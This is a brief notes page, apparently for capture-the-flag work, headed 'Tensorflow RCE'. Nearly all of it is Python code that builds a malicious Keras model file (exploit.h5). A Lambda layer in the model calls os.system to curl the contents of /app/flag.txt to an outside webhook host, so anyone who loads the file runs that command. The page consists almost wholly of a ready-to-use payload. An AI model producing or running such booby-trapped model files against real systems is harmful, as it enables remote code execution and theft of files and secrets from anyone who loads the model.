# AI

## Tensorflow RCE
- [Tensorflow RCE](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model)
- [Google Colab](https://colab.research.google.com/)

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("curl \"https://webhook.xxx/fl4g?content=$(cat /app/flag.txt)\"")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

```python
from google.colab import files
files.download("exploit.h5")
```